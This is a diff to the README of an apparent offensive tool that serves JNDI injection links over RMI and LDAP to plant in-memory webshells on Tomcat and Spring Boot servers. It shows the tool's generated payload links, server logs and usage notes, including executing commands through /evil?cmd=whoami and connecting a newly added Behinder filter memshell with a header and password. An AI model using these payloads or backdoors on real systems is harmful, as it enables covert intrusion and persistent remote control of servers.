@@ -18,34 +18,37 @@ $ java -jar JNDI-Injection-Memshell-1.0-SNAPSHOT-all.jar
 [ADDRESS] >> 127.0.0.1
 [COMMAND] >> open -a Calculator
 ----------------------------JNDI Links---------------------------- 
-Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
-rmi://127.0.0.1:1099/svbmvr
-Target environment(Springboot Interceptor Behinder Memshell):
-rmi://127.0.0.1:1099/wf0teg
-ldap://127.0.0.1:1389/wf0teg
+Target environment(Behinder Filter Memshell):
+rmi://127.0.0.1:1099/0gzbmk
+ldap://127.0.0.1:1389/0gzbmk
 Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
-rmi://127.0.0.1:1099/dsedk6
-ldap://127.0.0.1:1389/dsedk6
-Target environment(Behinder Servlet Memshell):
-rmi://127.0.0.1:1099/b3uiqm
-ldap://127.0.0.1:1389/b3uiqm
-Target environment(Springboot Interceptor Memshell):
-rmi://127.0.0.1:1099/2druq8
-ldap://127.0.0.1:1389/2druq8
-Target environment(Tomcat Filter Memshell):
-rmi://127.0.0.1:1099/h4bsck
-ldap://127.0.0.1:1389/h4bsck
-Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
-rmi://127.0.0.1:1099/6pvnje
-ldap://127.0.0.1:1389/6pvnje
+rmi://127.0.0.1:1099/q7empz
+ldap://127.0.0.1:1389/q7empz
 Target environment(Tomcat Servlet Memshell):
-rmi://127.0.0.1:1099/moasws
-ldap://127.0.0.1:1389/moasws
+rmi://127.0.0.1:1099/knesin
+ldap://127.0.0.1:1389/knesin
+Target environment(Behinder Servlet Memshell):
+rmi://127.0.0.1:1099/gfco3c
+ldap://127.0.0.1:1389/gfco3c
+Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
+rmi://127.0.0.1:1099/emytl0
+Target environment(Springboot Interceptor Memshell):
+rmi://127.0.0.1:1099/jdky8b
+ldap://127.0.0.1:1389/jdky8b
+Target environment(Springboot Interceptor Behinder Memshell):
+rmi://127.0.0.1:1099/4mpkre
+ldap://127.0.0.1:1389/4mpkre
+Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
+rmi://127.0.0.1:1099/3uzhzd
+ldap://127.0.0.1:1389/3uzhzd
+Target environment(Tomcat Filter Memshell):
+rmi://127.0.0.1:1099/93hurt
+ldap://127.0.0.1:1389/93hurt
 
 ----------------------------Server Log----------------------------
-2023-08-29 12:34:05 [JETTYSERVER]>> Listening on 0.0.0.0:8180
-2023-08-29 12:34:05 [RMISERVER]  >> Listening on 0.0.0.0:1099
-2023-08-29 12:34:06 [LDAPSERVER] >> Listening on 0.0.0.0:1389
+2023-08-29 13:00:30 [JETTYSERVER]>> Listening on 0.0.0.0:8180
+2023-08-29 13:00:30 [RMISERVER]  >> Listening on 0.0.0.0:1099
+2023-08-29 13:00:31 [LDAPSERVER] >> Listening on 0.0.0.0:1389
 ```
 
 - Tomcat Servlet Memshell
@@ -75,6 +78,10 @@ ldap://127.0.0.1:1389/moasws
   - Tomcat filter内存马，在访问路径/evil?cmd=whoami，可以执行命令
     ![ ](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/5.jpg)
 
+- Behinder Filter Memshell"
+  - Behinder filter内存马，访问路径/behinderFilter,并在request header中的shell参数中跟上Behinder，输入密码即可连接
+    ![ ](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/6.jpg)
+    
 ## Tips:
 
 Q:为什么有了Servlet/Controller内存马还是需要Interceptor内存马呢？
